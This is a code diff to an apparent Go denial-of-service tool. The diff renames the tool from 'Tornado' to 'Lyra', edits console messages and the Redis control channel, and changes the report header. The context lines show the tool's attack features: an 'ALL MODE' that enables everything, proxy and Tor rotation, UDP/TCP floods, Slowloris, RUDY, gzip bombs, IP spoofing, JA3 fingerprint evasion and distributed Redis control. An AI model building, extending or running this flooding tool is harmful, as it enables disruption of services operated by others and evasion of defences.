@@ -41,6 +41,8 @@ const BANNER = `
 [0;96;46m█▓░[0;37;40m [0;90;40m█[0;37;40m [0;96;46m░▓▒█▓░[0;37;40m [0;90;40m█[0;37;40m [0;96;46m░▓▒▓▒[0;36;40m█[0;37;40m [0;90;40m████[0;37;40m [0;96;46m▒▓░[0;37;40m [0;90;40m█[0;37;40m [0;96;46m░▓█[0m
 [0;96;46m██▒[0;37;40m [0;90;40m█[0;37;40m [0;96;46m▒█▓[0;96;40m▀[0;96;46m█[0;96;40m▓▄▄▄[0;96;46m▒█▓[0;36;40m███[0;37;40m [0;90;40m████[0;37;40m [0;96;46m▓█▒[0;37;40m [0;90;40m█[0;37;40m [0;96;46m▒██[0m
 [0;96;46m██▓[0;96;40m▄▄▄[0;96;46m▓█[0;96;40m▀[0;37;40m [0;96;40m▄▄▄▄▄[0;96;46m▓█[0;96;40m▀[0;36;40m███[0;37;40m      [0;96;40m▀[0;96;46m█▓[0;96;40m▄▄▄[0;96;46m▓██[0m
+
+
 `
 
 // ==================== GLOBAL VARIABLES ====================
@@ -132,7 +134,7 @@ func fetchProxies() {
 		fmt.Println("[!] File proxy kosong, beralih ke download otomatis.")
 	}
 
-	fmt.Println("[*] Mengunduh proxy dari internet...")
+	fmt.Println(" Download proxy ....")
 	client := &http.Client{
 		Timeout: 10 * time.Second,
 		Transport: &http.Transport{
@@ -203,7 +205,7 @@ func fetchProxies() {
 	}
 	wg.Wait()
 	proxyList = alive
-	fmt.Printf("[*] %d proxy hidup siap pakai.\n", len(proxyList))
+	fmt.Printf("[*] %d proxy hidup..\n", len(proxyList))
 }
 
 func getProxy() string {
@@ -476,13 +478,13 @@ func statsPrinter() {
 
 			width := getTerminalWidth()
 			// Bangun string statistik tanpa ANSI untuk dihitung panjangnya
-			raw := fmt.Sprintf(" 🌪 Total: %d | Sukses: %d | Gagal: %d | Rate: %d req/s", total, success, failed, rate)
+			raw := fmt.Sprintf(" 🎆 Total: %d | Sukses: %d | Gagal: %d | Rate: %d req/s", total, success, failed, rate)
 			clean := stripANSI(raw)
 			cleanLen := len(clean)
 
 			if cleanLen <= width {
 				// Muat dalam satu baris
-				fmt.Printf("\r\033[93m 🌪 Total: \033[97m%d \033[93m| Sukses: \033[92m%d \033[93m| Gagal: \033[91m%d \033[93m| Rate: \033[97m%d req/s\033[0m",
+				fmt.Printf("\r\033[93m 🎆 Total: \033[97m%d \033[93m| Sukses: \033[92m%d \033[93m| Gagal: \033[91m%d \033[93m| Rate: \033[97m%d req/s\033[0m",
 					total, success, failed, rate)
 			} else {
 				// Tidak muat → cetak dalam 2 baris
@@ -496,7 +498,7 @@ func statsPrinter() {
 					line2 = truncateText(line2, maxLineWidth)
 				}
 				fmt.Printf("\r\033[K")
-				fmt.Printf("\033[93m 🌪\033[0m\n")
+				fmt.Printf("\033[93m 🎆\033[0m\n")
 				fmt.Printf("%s\n", line1)
 				fmt.Printf("%s", line2)
 			}
@@ -509,7 +511,7 @@ func redisListener() {
 	if !enableRedis || rdb == nil {
 		return
 	}
-	pubsub := rdb.Subscribe(ctx, "tornado_control")
+	pubsub := rdb.Subscribe(ctx, "lyra_control")
 	defer pubsub.Close()
 	for {
 		select {
@@ -560,7 +562,7 @@ func main() {
 	}
 
 	if attackAll {
-		fmt.Println("💣 ALL MODE AKTIF – Semua fitur dinyalakan!")
+		fmt.Println("💣 ALL MODE ON.......")
 		enableHTTP2 = true
 		enableProxy = true
 		enableUDP = true
@@ -621,13 +623,13 @@ func main() {
 	stopChan = make(chan struct{})
 
 	// ==================== START ATTACK ====================
-	fmt.Printf("\n[🌪] Tornado menghantam %s\n", targetURL)
-	fmt.Printf("[🧨] Workers: %d, Duration: %ds\n", workers, duration)
-	fmt.Printf("[⚙️] Methods: %v\n", methodList)
-	fmt.Printf("[🚀] HTTP/2: %v, Proxy: %v, Tor: %v\n", enableHTTP2, enableProxy, enableTor)
-	fmt.Printf("[☄️] UDP: %v, TCP: %v, Slowloris: %v\n", enableUDP, enableTCP, enableSlowloris)
-	fmt.Printf("[💣] Gzip Bomb: %v, Deep JSON: %v, RUDY: %v\n", enableGzip, enableDeepJSON, enableRUDY)
-	fmt.Printf("[🎆] Spoofing: %v, JA3: %v, Redis: %v\n", enableSpoof, enableJA3, enableRedis)
+	fmt.Printf("\n Sending Requests %s\n", targetURL)
+	fmt.Printf(" Workers: %d, Duration: %ds\n", workers, duration)
+	fmt.Printf(" Methods: %v\n", methodList)
+	fmt.Printf(" HTTP/2: %v, Proxy: %v, Tor: %v\n", enableHTTP2, enableProxy, enableTor)
+	fmt.Printf(" UDP: %v, TCP: %v, Slowloris: %v\n", enableUDP, enableTCP, enableSlowloris)
+	fmt.Printf(" Gzip Bomb: %v, Deep JSON: %v, RUDY: %v\n", enableGzip, enableDeepJSON, enableRUDY)
+	fmt.Printf(" Spoofing: %v, JA3: %v, Redis: %v\n", enableSpoof, enableJA3, enableRedis)
 	
 
 	// UDP/TCP/Slowloris background
@@ -663,7 +665,7 @@ func main() {
 	case <-sigChan:
 		fmt.Println("\n[!] Dihentikan oleh pengguna.")
 		if enableRedis && rdb != nil {
-			rdb.Publish(ctx, "tornado_control", "STOP")
+			rdb.Publish(ctx, "lyra_control", "STOP")
 		}
 	}
 
@@ -675,7 +677,7 @@ func main() {
 	success := atomic.LoadUint64(&stats.success)
 	failed := atomic.LoadUint64(&stats.failed)
 	fmt.Println("\n" + strings.Repeat("=", 40))
-	fmt.Println("             TORNADO  REPORT")
+	fmt.Println("           LYRA  RESULT")
 	fmt.Println(strings.Repeat("=", 40))
 	fmt.Printf("Total request   : %d\n", total)
 	fmt.Printf("Success (2xx-3xx) : %d\n", success)
